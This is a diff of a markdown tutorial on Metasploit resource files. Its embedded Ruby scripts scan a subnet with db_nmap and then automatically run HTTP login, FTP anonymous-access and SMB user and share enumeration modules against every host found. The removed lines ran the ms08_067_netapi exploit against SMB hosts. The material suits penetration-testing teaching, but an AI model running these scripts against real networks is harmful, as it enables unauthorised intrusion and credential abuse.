@@ -31,7 +31,8 @@
 ##  HOW TO RUN RESOURCE SCRIPTS?
 <blockquote>You can run resource scripts from msfconsole or from the web interface. Before you can run a resource script, you need to identify the required parameters that need to be configured for the script to run. If you're a Metasploit Framework user, you can run a resource script from msfconsole or meterpreter prompt with the resource command or you can run a resource script when you start msfconsole with the -r flag (making msfconsole executing the resource script at startup).</blockquote>
 
-- **Run::from::msfconsole::startup**
+
+To run resource script at msfconsole start execute the follow commands in your terminal.
 
       msfconsole -r script.rc
       msfconsole -r /root/script.rc
@@ -125,7 +126,7 @@
 
 ![gif](http://i68.tinypic.com/343oefb.gif)
 
-<blockquote>Final Note: Resource Files give us the ability to execute sequentially metasploit core commands, so if we read metasploit core commands we have many combinations that we can use in resource files scripting.</blockquote>
+<blockquote>Final Note: Resource Files give us the ability to execute sequentially metasploit core commands, so if we read metasploit core commands list we have many combinations that we can use in resource files scripting.</blockquote>
 
 #### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)
 
@@ -269,9 +270,9 @@
        Rex::sleep(2)
        run_single("hosts")
 
-   print_warning("exporting database to: template.xml")
-   Rex::sleep(1.5)
-   run_single("db_export -f xml template.xml")
+    print_warning("exporting database to: template.xml")
+    Rex::sleep(1.5)
+    run_single("db_export -f xml template.xml")
 </ruby>
 ```
 `[run]` msfconsole -r /root/template.rc
@@ -286,15 +287,22 @@
 db_nmap -sV -Pn -T4 -p 80 --open --reason 192.168.1.0/24
 services
    <ruby>
+     help = %Q|
+       Description:
+         This Metasploit RC file can be used to automate the exploitation process.
+         In this example we are triggering http/auxiliarys againts all hosts in db
+     Author:
+         r00t-3xp10it  <pedroubuntu10[at]hotmail.com>
+     |
+     print_line(help)
+     Rex::sleep(1.5)
+
      xhost = framework.db.hosts.map(&:address).join(' ')
            run_single("setg RHOSTS #{xhost}")
-           print_good("######### http title auxiliary #########")
            run_single("use auxiliary/scanner/http/title")
            run_single("exploit")
-           print_good("######### dir_scanner auxiliary #########")
            run_single("use auxiliary/scanner/http/dir_scanner")
            run_single("exploit")
-           print_good("######### http_login auxiliary ##########")
            run_single("use auxiliary/scanner/http/http_login")
            run_single("exploit")
    </ruby>
@@ -309,37 +317,50 @@ unsetg RHOSTS
 - **Run auxiliary/exploit modules based on database (targets) ports found::**`[script: recon.rc]`<br />
 
 ```
-db_nmap -sV -Pn -T4 -p 80,445,139 --open --reason 192.168.1.0/24
+db_nmap -sV -Pn -T4 -p 21,80,445 --open --reason 192.168.1.0/24
 services
    <ruby>
+      help = %Q|
+        Description:
+          This Metasploit RC file can be used to automate the exploitation process.
+          In this example we are triggering auxiliary/scanners based on target ports
+      Author:
+          r00t-3xp10it  <pedroubuntu10[at]hotmail.com>
+      |
+      print_line(help)
+      Rex::sleep(1.5)
+
       xhost = framework.db.hosts.map(&:address).join(' ')
       xport = framework.db.services.map(&:port).join(' ')
       run_single("setg RHOSTS #{xhost}")
 
+         if xport =~ /21/i
+              print_status("## Target port: 21 ftp found")
+              print_good("## Running port 21 auxiliary/exploits.")
+              run_single("use auxiliary/scanner/ftp/ftp_version")
+              run_single("exploit")
+              run_single("use auxiliary/scanner/ftp/ftp_anonymous")
+              run_single("exploit")
+         end
+
          if xport =~ /80/i
               print_status("## Target port: 80 http found")
-              print_good("## Running port 80 auxiliary/exploits.")
               run_single("use auxiliary/scanner/http/title")
               run_single("exploit")
-              print_good("######### dir_scanner auxiliary #########")
               run_single("use auxiliary/scanner/http/dir_scanner")
               run_single("exploit")
-              print_good("######### http_login auxiliary #########")
               run_single("use auxiliary/scanner/http/http_login")
               run_single("exploit")
          end
 
          if xport =~ /445/i
-              print_status("## Target port: 445 https found")
+              print_status("## Target port: 445 smb found")
               print_good("## Running port 445 auxiliary/exploits.")
-              run_single("use exploit/windows/smb/ms08_067_netapi")
+              run_single("use auxiliary/scanner/smb/smb_version")
               run_single("exploit")
-         end
-
-         if xport =~ /139/i
-              print_status("## Target port: 139 smb found")
-              print_good("## Running port 139 auxiliary/exploits.")
-              run_single("use exploit/windows/smb/ms08_067_netapi")
+              run_single("use auxiliary/scanner/smb/smb_enumusers")
+              run_single("exploit")
+              run_single("use auxiliary/scanner/smb/smb_enumshares")
               run_single("exploit")
          end
    </ruby>
